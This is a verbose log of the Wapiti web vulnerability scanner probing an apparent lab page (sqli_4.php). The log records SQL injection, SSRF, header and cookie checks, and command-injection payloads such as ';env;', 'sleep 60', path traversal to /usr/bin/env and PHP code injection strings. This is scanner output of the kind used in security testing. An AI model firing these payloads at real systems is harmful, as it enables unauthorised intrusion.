2024-03-20 16:46:10.346 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/sqli_4.php?title=fuzz&action=search (0)
	data: form_bug=&bug=27%22%20AND%2030%3D119%20AND%20%2299%22%3D%2299
2024-03-20 16:46:16.484 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%22%20AND%2072%3D120%20AND%20%2294%22%3D%2294
2024-03-20 16:46:16.495 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%22%20AND%2050%3D50%20AND%20%2265%22%3D%2265
2024-03-20 16:46:16.504 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%29%20AND%2082%3D134%20AND%20%2853%3D53
2024-03-20 16:46:16.512 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%29%20AND%2095%3D170%20AND%20%2885%3D85
2024-03-20 16:46:16.520 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%29%20AND%2033%3D33%20AND%20%2897%3D97
2024-03-20 16:46:16.529 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%27%29%20AND%2044%3D119%20AND%20%28%2799%27%3D%2799
2024-03-20 16:46:16.538 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%27%29%20AND%2061%3D71%20AND%20%28%2733%27%3D%2733
2024-03-20 16:46:16.548 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%27%29%20AND%2035%3D35%20AND%20%28%2786%27%3D%2786
2024-03-20 16:46:16.556 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%22%29%20AND%2025%3D63%20AND%20%28%2259%22%3D%2259
2024-03-20 16:46:16.563 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%22%29%20AND%2041%3D133%20AND%20%28%2261%22%3D%2261
2024-03-20 16:46:16.571 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27%22%29%20AND%2053%3D53%20AND%20%28%2273%22%3D%2273
2024-03-20 16:46:16.586 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=2
2024-03-20 16:46:16.586 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit%C2%BF%27%22%28&security_level=2
2024-03-20 16:46:16.594 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=submit%C2%BF%27%22%28
2024-03-20 16:46:16.608 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit%20AND%2035%3D70%20AND%2081%3D81&security_level=2
2024-03-20 16:46:16.615 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit%27%20AND%2097%3D122%20AND%20%2745%27%3D%2745&security_level=2
2024-03-20 16:46:16.622 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit%22%20AND%2097%3D186%20AND%20%2284%22%3D%2284&security_level=2
2024-03-20 16:46:16.630 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit%29%20AND%2034%3D56%20AND%20%2858%3D58&security_level=2
2024-03-20 16:46:16.639 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit%27%29%20AND%2019%3D108%20AND%20%28%2778%27%3D%2778&security_level=2
2024-03-20 16:46:16.647 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit%22%29%20AND%2094%3D107%20AND%20%28%2236%22%3D%2236&security_level=2
2024-03-20 16:46:16.654 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=2%20AND%2051%3D103%20AND%2065%3D65
2024-03-20 16:46:16.661 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=2%27%20AND%2081%3D157%20AND%20%2748%27%3D%2748
2024-03-20 16:46:16.670 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=2%22%20AND%2020%3D84%20AND%20%2262%22%3D%2262
2024-03-20 16:46:16.678 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=2%29%20AND%2072%3D98%20AND%20%2846%3D46
2024-03-20 16:46:16.685 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=2%27%29%20AND%2031%3D100%20AND%20%28%2714%27%3D%2714
2024-03-20 16:46:16.691 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=2%22%29%20AND%2034%3D100%20AND%20%28%2211%22%3D%2211
2024-03-20 16:46:16.721 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-20 16:46:16.779 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
2024-03-20 16:46:16.790 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php?title=fuzz&action=search (0)
2024-03-20 16:46:16.818 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php?title=default&action=search (1)
2024-03-20 16:46:16.837 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php (1)
2024-03-20 16:46:16.848 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27
2024-03-20 16:46:16.866 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=2
2024-03-20 16:46:16.893 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-20 16:46:16.907 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php?title=fuzz&action=search (0)
2024-03-20 16:46:16.917 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-20 16:46:16.918 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-20 16:46:16.981 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-20 16:46:16.981 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-20 16:46:17.086 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-20 16:46:17.098 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php?title=fuzz&action=search (0)
2024-03-20 16:46:17.099 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/sqli_4.php?title=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fm6mnhj%2F1%2F7469746c65%2F&action=search (0)
2024-03-20 16:46:17.113 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/sqli_4.php?title=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fm6mnhj%2F1%2F616374696f6e%2F (0)
2024-03-20 16:46:17.135 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php?title=default&action=search (1)
2024-03-20 16:46:17.135 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/sqli_4.php?title=default&action=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fm6mnhj%2F3%2F616374696f6e%2F (1)
2024-03-20 16:46:17.157 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php (1)
2024-03-20 16:46:17.171 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=27
2024-03-20 16:46:17.171 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fm6mnhj%2F2%2F666f726d5f627567%2F&bug=27
2024-03-20 16:46:17.182 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/sqli_4.php (1)
	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fm6mnhj%2F2%2F627567%2F
2024-03-20 16:46:17.199 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=2
2024-03-20 16:46:17.199 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fm6mnhj%2F5%2F666f726d5f73656375726974795f6c6576656c%2F&security_level=2
2024-03-20 16:46:17.208 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] POST http://web/sqli_4.php (1)
	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fm6mnhj%2F5%2F73656375726974795f6c6576656c%2F
2024-03-20 16:46:17.241 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=m6mnhj for results, please wait...
2024-03-20 16:46:19.365 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-20 16:46:19.381 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php?title=fuzz&action=search (0)
2024-03-20 16:46:19.391 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
2024-03-20 16:46:19.510 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-20 16:46:19.525 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php?title=fuzz&action=search (0)
2024-03-20 16:46:19.526 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
2024-03-20 16:46:19.526 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
2024-03-20 16:46:19.565 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
2024-03-20 16:46:19.605 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : security_level
2024-03-20 16:46:19.605 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : security_level
2024-03-20 16:46:19.646 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : security_level
2024-03-20 16:46:19.727 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-20 16:46:19.739 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php?title=fuzz&action=search (0)
2024-03-20 16:46:19.741 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%3Benv%3B&action=search (0)
2024-03-20 16:46:19.751 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%7Cenv%7C&action=search (0)
2024-03-20 16:46:19.762 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=a%3Benv%3B&action=search (0)
2024-03-20 16:46:19.775 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=a%3Benv%3B&action=search (0)
2024-03-20 16:46:19.785 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&action=search (0)
2024-03-20 16:46:19.800 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz%3Benv%3B&action=search (0)
2024-03-20 16:46:19.815 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz%0Aenv%3B&action=search (0)
2024-03-20 16:46:19.824 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%26set%26&action=search (0)
2024-03-20 16:46:19.838 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=set&action=search (0)
2024-03-20 16:46:19.854 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=env&action=search (0)
2024-03-20 16:46:19.866 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%2Fe%00&action=search (0)
2024-03-20 16:46:19.879 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
2024-03-20 16:46:19.887 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
2024-03-20 16:46:19.894 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
2024-03-20 16:46:19.903 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
2024-03-20 16:46:19.911 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
2024-03-20 16:46:19.919 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
2024-03-20 16:46:19.926 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
2024-03-20 16:46:19.934 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
2024-03-20 16:46:19.941 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
2024-03-20 16:46:19.950 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
2024-03-20 16:46:19.960 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&action=search (0)
2024-03-20 16:46:19.972 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&action=search (0)
2024-03-20 16:46:19.984 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&action=search (0)
2024-03-20 16:46:19.998 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=a%60%29%60&action=search (0)
2024-03-20 16:46:20.010 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=a%60sleep%2060%60&action=search (0)
2024-03-20 16:46:20.021 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=a%3Bsleep%2060%3B&action=search (0)
2024-03-20 16:46:20.032 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=a%7Csleep%2060%3B&action=search (0)
2024-03-20 16:46:20.044 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=%26ping%20-n%2025%20127.0.0.1%26&action=search (0)
2024-03-20 16:46:20.056 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%3Benv%3B (0)
2024-03-20 16:46:20.067 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%7Cenv%7C (0)
2024-03-20 16:46:20.076 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=a%3Benv%3B (0)
2024-03-20 16:46:20.086 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=a%3Benv%3B (0)
2024-03-20 16:46:20.095 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-20 16:46:20.106 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=search%3Benv%3B (0)
2024-03-20 16:46:20.117 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=search%0Aenv%3B (0)
2024-03-20 16:46:20.126 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%26set%26 (0)
2024-03-20 16:46:20.135 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=set (0)
2024-03-20 16:46:20.144 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=env (0)
2024-03-20 16:46:20.155 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%2Fe%00 (0)
2024-03-20 16:46:20.165 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:46:20.176 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:46:20.188 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:46:20.197 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:46:20.207 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:46:20.218 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:46:20.228 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:46:20.238 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:46:20.248 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:46:20.260 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:46:20.273 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 16:46:20.288 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 16:46:20.297 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-20 16:46:20.308 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=a%60%29%60 (0)
2024-03-20 16:46:20.318 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=a%60sleep%2060%60 (0)
2024-03-20 16:46:20.327 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=a%3Bsleep%2060%3B (0)
2024-03-20 16:46:20.338 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=a%7Csleep%2060%3B (0)
2024-03-20 16:46:20.348 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=fuzz&action=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-20 16:46:20.364 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_4.php?title=default&action=search (1)
2024-03-20 16:46:20.366 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%3Benv%3B (1)
2024-03-20 16:46:20.375 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%7Cenv%7C (1)
2024-03-20 16:46:20.387 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=a%3Benv%3B (1)
2024-03-20 16:46:20.396 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=a%3Benv%3B (1)
2024-03-20 16:46:20.406 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (1)
2024-03-20 16:46:20.417 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=search%3Benv%3B (1)
2024-03-20 16:46:20.426 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=search%0Aenv%3B (1)
2024-03-20 16:46:20.436 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%26set%26 (1)
2024-03-20 16:46:20.445 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=set (1)
2024-03-20 16:46:20.456 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=env (1)
2024-03-20 16:46:20.466 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%2Fe%00 (1)
2024-03-20 16:46:20.477 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:46:20.490 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:46:20.501 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:46:20.513 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:46:20.524 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
2024-03-20 16:46:20.535 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
2024-03-20 16:46:20.544 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_4.php?title=default&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
